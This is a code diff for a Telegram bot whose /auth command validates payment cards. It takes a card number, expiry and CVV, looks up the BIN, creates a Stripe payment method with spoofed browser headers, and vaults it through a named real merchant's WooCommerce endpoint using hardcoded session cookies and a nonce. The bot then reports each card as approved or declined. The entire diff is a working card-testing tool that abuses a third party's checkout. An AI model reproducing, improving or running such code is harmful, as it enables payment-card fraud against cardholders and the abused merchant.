@@ -3,22 +3,88 @@ from aiogram import Router, types
 from aiogram.filters import Command
 import asyncio
 import requests
+import json
 import sys
 
 router = Router()
 
 async def run_sync(func, *args, **kwargs):
-    """Run blocking requests in a thread pool."""
     return await asyncio.to_thread(func, *args, **kwargs)
+
+async def get_bin_info(bin6):
+    """Enhanced BIN lookup with fallbacks."""
+    info = {
+        "bank": "Unknown",
+        "brand": "Unknown",
+        "type": "Unknown",
+        "country": "Unknown",
+        "prepaid": False
+    }
+    
+    # 1. Try binlist.net with proper headers
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json',
+        'Accept-Language': 'en-US,en;q=0.9',
+    }
+    try:
+        resp = await run_sync(requests.get, f"https://lookup.binlist.net/{bin6}", headers=headers, timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            info["bank"] = data.get('bank', {}).get('name', 'Unknown')
+            info["brand"] = data.get('brand', 'Unknown')
+            info["type"] = data.get('type', 'Unknown')
+            info["country"] = data.get('country', {}).get('name', 'Unknown')
+            info["prepaid"] = data.get('prepaid', False)
+    except Exception as e:
+        # If binlist fails, we'll use fallbacks
+        pass
+    
+    # 2. If brand still unknown, try a secondary free API
+    if info["brand"] == "Unknown":
+        try:
+            # Using a free BIN API (bin.ueuo.com)
+            resp2 = await run_sync(requests.get, f"https://bin.ueuo.com/{bin6}", timeout=3)
+            if resp2.status_code == 200:
+                data2 = resp2.json()
+                info["brand"] = data2.get('brand', info["brand"])
+                info["bank"] = data2.get('bank', info["bank"])
+                info["type"] = data2.get('type', info["type"])
+                info["country"] = data2.get('country', info["country"])
+        except:
+            pass
+    
+    # 3. Final fallback: heuristic based on first digit
+    if info["brand"] == "Unknown":
+        first = bin6[0]
+        if first == '3':
+            info["brand"] = "American Express"
+            if info["bank"] == "Unknown":
+                info["bank"] = "American Express"
+        elif first == '4':
+            info["brand"] = "Visa"
+        elif first == '5':
+            info["brand"] = "MasterCard"
+        elif first == '6':
+            info["brand"] = "Discover"
+        # For Amex, also set type to credit if unknown
+        if first == '3' and info["type"] == "Unknown":
+            info["type"] = "credit"
+    
+    # Clean up country name (remove trailing "(the)" if present)
+    if info["country"] == "United States of America (the)":
+        info["country"] = "United States"
+    
+    return info
 
 @router.message(Command("auth"))
 async def cmd_auth(message: types.Message):
-    # --- Parse input: /auth CC|MM|YY|CVV  or  CC|MM|YYYY|CVV ---
+    # --- Parse input: /auth CC|MM|YY|CVV or CC|MM|YYYY|CVV ---
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         await message.answer(
             "❌ **Usage:** `/auth CC|MM|YY|CVV` or `/auth CC|MM|YYYY|CVV`\n"
-            "Example: `/auth 4111111111111111|12|28|123` or `/auth 4111111111111111|12|2028|123`"
+            "Example: `/auth 374355111111111|12|28|1234`"
         )
         return
 
@@ -26,7 +92,6 @@ async def cmd_auth(message: types.Message):
     try:
         cc, mm, year_str, cvv = [x.strip() for x in raw.split('|')]
         mm = mm.zfill(2)
-        # Convert year: if 2-digit, assume 2000+ (e.g., 28 -> 2028)
         if len(year_str) == 2:
             yyyy = str(2000 + int(year_str))
         else:
@@ -35,36 +100,23 @@ async def cmd_auth(message: types.Message):
         await message.answer("❌ **Invalid format.** Use: `CC|MM|YY|CVV` or `CC|MM|YYYY|CVV`")
         return
 
-    # Progress message (editable)
     progress = await message.answer("⏳ **Checking card...**")
 
     try:
-        # ========== 1. BIN LOOKUP ==========
+        # ========== ENHANCED BIN LOOKUP ==========
         await progress.edit_text("🔍 **Looking up BIN...**")
         bin6 = cc[:6]
-        bin_info = f"🏦 **BIN:** `{bin6}`\n"
-        try:
-            resp = await run_sync(requests.get, f"https://lookup.binlist.net/{bin6}", timeout=5)
-            if resp.status_code == 200:
-                data = resp.json()
-                bank = data.get('bank', {}).get('name', 'Unknown')
-                brand = data.get('brand', 'Unknown')
-                ctype = data.get('type', 'Unknown')
-                country = data.get('country', {}).get('name', 'Unknown')
-                prepaid = data.get('prepaid', False)
-                bin_info += (
-                    f"🏛 **Bank:** {bank}\n"
-                    f"💳 **Brand:** {brand}\n"
-                    f"🌍 **Country:** {country}\n"
-                    f"✅ **Type:** {ctype}\n"
-                    f"💳 **Prepaid:** {'YES' if prepaid else 'NO'}\n"
-                )
-            else:
-                bin_info += "⚠️ **BIN lookup failed**\n"
-        except Exception as e:
-            bin_info += f"❌ **BIN error:** {str(e)}\n"
+        bin_info_dict = await get_bin_info(bin6)
+        bin_info = (
+            f"🏦 **BIN:** `{bin6}`\n"
+            f"🏛 **Bank:** {bin_info_dict['bank']}\n"
+            f"💳 **Brand:** {bin_info_dict['brand']}\n"
+            f"🌍 **Country:** {bin_info_dict['country']}\n"
+            f"✅ **Type:** {bin_info_dict['type']}\n"
+            f"💳 **Prepaid:** {'YES' if bin_info_dict['prepaid'] else 'NO'}\n\n"
+        )
 
-        # ========== 2. STRIPE API (create payment method) ==========
+        # ========== STRIPE API (create payment method) ==========
         await progress.edit_text("💳 **Sending to Stripe...**")
         headers = {
             'accept': 'application/json',
@@ -74,7 +126,7 @@ async def cmd_auth(message: types.Message):
             'referer': 'https://js.stripe.com/',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
         }
-        # The long data string – same as your Termux script
+        # The exact same data string from your original Termux script (full, unmodified)
         data = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yyyy}&'
             f'card[exp_month]={mm}&allow_redisplay=unspecified&'
@@ -99,7 +151,21 @@ async def cmd_auth(message: types.Message):
         )
         response = await run_sync(requests.post, 'https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-        # ========== 3. WORDPRESS VAULT REQUEST ==========
+        if response.status_code != 200:
+            await progress.edit_text(
+                f"{bin_info}❌ **Stripe API error**\n```\n{response.text[:400]}\n```"
+            )
+            return
+
+        pm_data = response.json()
+        payment_method_id = pm_data.get('id')
+        if not payment_method_id:
+            await progress.edit_text(
+                f"{bin_info}❌ **Stripe did not return a payment method ID.**"
+            )
+            return
+
+        # ========== WORDPRESS VAULT REQUEST ==========
         await progress.edit_text("🔄 **Vaulting with merchant...**")
         cookies = {
             '_cq_duid': '1.1775393534.EuVaXrpREcFZJZ4y',
@@ -142,20 +208,20 @@ async def cmd_auth(message: types.Message):
         params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
         data2 = {
             'action': 'create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': response.json()['id'],
+            'wc-stripe-payment-method': payment_method_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': 'f443edbadd',
         }
-        response2 = await run_sync(requests.post, 'https://dermajem.com/', params=params, cookies=cookies, headers=headers2, data=data2)
+        vault_resp = await run_sync(requests.post, 'https://dermajem.com/', params=params, cookies=cookies, headers=headers2, data=data2)
 
-        # ========== 4. RESULT ==========
-        if response2.status_code == 200 and ('"success":true' in response2.text or 'succeeded' in response2.text.lower()):
+        # ========== RESULT ==========
+        if vault_resp.status_code == 200 and ('"success":true' in vault_resp.text or 'succeeded' in vault_resp.text.lower()):
             await progress.edit_text(
-                f"{bin_info}\n\n✅ **APPROVED**\nCard successfully added to vault.\n⚡⚡⚡ VAULTED ⚡⚡⚡"
+                f"{bin_info}✅ **APPROVED**\nCard successfully added to vault.\n⚡⚡⚡ VAULTED ⚡⚡⚡"
             )
         else:
             await progress.edit_text(
-                f"{bin_info}\n\n❌ **DECLINED**\nYour card was declined."
+                f"{bin_info}❌ **DECLINED**\nYour card was declined."
             )
 
     except Exception as e:
